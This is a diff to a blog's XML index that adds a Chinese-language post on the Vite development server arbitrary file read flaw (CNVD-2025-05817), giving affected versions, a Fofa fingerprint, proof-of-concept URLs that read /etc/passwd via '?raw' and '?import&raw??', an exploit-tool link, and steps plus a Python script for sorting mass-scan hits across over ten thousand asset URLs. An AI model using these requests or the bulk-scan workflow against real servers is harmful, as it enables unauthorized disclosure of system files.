@@ -4,6 +4,31 @@
   
     
     <entry>
+      <title>Vite开发服务器任意文件读取漏洞(CNVD-2025-05817)</title>
+      <link href="/2025/03/28/20/"/>
+      <url>/2025/03/28/20/</url>
+      
+        <content type="html"><![CDATA[<h4 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Vite是Vite开源的一种新型的前端构建工具。Vite存在访问控制错误漏洞，该漏洞源于URL中的?raw??或?import&amp;raw??可以绕过文件访问限制，返回任意文件内容。</span><br></pre></td></tr></table></figure><h4 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">6.2.0 &lt;= Vite &lt;= 6.2.2</span><br><span class="line">6.1.0 &lt;= Vite &lt;= 6.1.1</span><br><span class="line">6.0.0 &lt;= Vite &lt;= 6.0.11</span><br><span class="line">5.0.0 &lt;= Vite &lt;= 5.4.14</span><br><span class="line">Vite &lt;= 4.5.9</span><br></pre></td></tr></table></figure><h4 id="Fofa指纹"><a href="#Fofa指纹" class="headerlink" title="Fofa指纹"></a>Fofa指纹</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">body=&quot;/@vite/client&quot;</span><br></pre></td></tr></table></figure><h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">漏洞利用工具: https://github.com/ThumpBo/CVE-2025-30208-EXP</span><br><span class="line">验证POC：</span><br><span class="line">http://test.com/etc/passwd?raw</span><br><span class="line">http://test.com/etc/passwd?import&amp;raw??</span><br></pre></td></tr></table></figure><h4 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h4><p>1、将所有资产下载下来<br>2、提取出CSV文件中的”资产的URL链接”,大概有一万多条url<br>3、利用ThumpBo师傅的EXP工具进行爆破<br>4、编写python脚本提取出带有域名的资产（将跑出来的output.txt放在当前脚本目录下，替换其中的[[31mSUCCESS[0m]乱码为[SUCCESS]然后运行脚本即可）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">filter_unique_domain_urls</span>(<span class="params">urls</span>):</span><br><span class="line">    unique_domains = <span class="built_in">set</span>()</span><br><span class="line">    filtered_urls = []</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> url <span class="keyword">in</span> urls:</span><br><span class="line">        url = url.strip()</span><br><span class="line">        parsed_url = urlparse(url)</span><br><span class="line">        domain = parsed_url.netloc</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 检查是否是 IP 地址</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> re.<span class="keyword">match</span>(<span class="string">r&#x27;\d+\.\d+\.\d+\.\d+&#x27;</span>, domain):</span><br><span class="line">            <span class="comment"># 提取一级域名</span></span><br><span class="line">            domain_parts = domain.split(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(domain_parts) &gt; <span class="number">2</span>:</span><br><span class="line">                domain = <span class="string">&#x27;.&#x27;</span>.join(domain_parts[-<span class="number">2</span>:])</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> domain <span class="keyword">not</span> <span class="keyword">in</span> unique_domains:</span><br><span class="line">                unique_domains.add(domain)</span><br><span class="line">                filtered_urls.append(url)</span><br><span class="line">    <span class="comment"># 输出结果</span></span><br><span class="line">    <span class="keyword">for</span> filtered_url <span class="keyword">in</span> filtered_urls:</span><br><span class="line">        <span class="built_in">print</span>(filtered_url)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_success_urls</span>(<span class="params">file_path</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        lines = file.readlines()</span><br><span class="line">    </span><br><span class="line">    success_urls = []</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">        matches = re.findall(<span class="string">r&#x27;\[SUCCESS\]\s*(https?://[^\s\[\]]+)&#x27;</span>, line)</span><br><span class="line">        success_urls.extend(matches)</span><br><span class="line">    filter_unique_domain_urls(success_urls)</span><br><span class="line"></span><br><span class="line">file_path = <span class="string">&#x27;output.txt&#x27;</span></span><br><span class="line">extract_success_urls(file_path)</span><br></pre></td></tr></table></figure><p>5、结果如下<br><img src="/2025/03/28/20/PixPin_2025-03-29_00-28-12.png"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> POC_By_Bbdolt </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Vite </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>Webgoat靶场学习笔记</title>
       <link href="/2025/01/20/19/"/>
       <url>/2025/01/20/19/</url>
@@ -203,9 +228,9 @@
       
         <tags>
             
-            <tag> 网鼎杯 </tag>
-            
             <tag> SMC </tag>
+            
+            <tag> 网鼎杯 </tag>
             
             <tag> 堆栈平衡 </tag>
             
